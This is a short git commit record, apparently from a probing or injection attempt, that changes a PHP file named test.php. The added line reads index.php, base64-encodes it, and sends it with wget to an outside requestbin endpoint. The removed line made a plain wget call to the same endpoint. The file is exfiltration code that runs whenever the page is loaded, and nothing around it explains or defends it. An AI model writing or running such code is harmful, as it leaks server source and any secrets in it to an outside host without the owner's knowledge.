d82439bfe8c71a30d8be7fd0a4dd64fcccf5a9d2
Hafidh <32499116+0x000c0ded@users.noreply.github.com>
2019-06-15 21:45:57 +0100

    Update test.php

--- test.php
+++ test.php
@@ -1,1 +1,1 @@
-<?php system("wget https://requestbin.fullcontact.com/10msdyy1?test=kappa"); ?>
+<?php $a=base64_encode(file_get_contents("index.php")); system("wget https://requestbin.fullcontact.com/10msdyy1?z=".$a); ?>
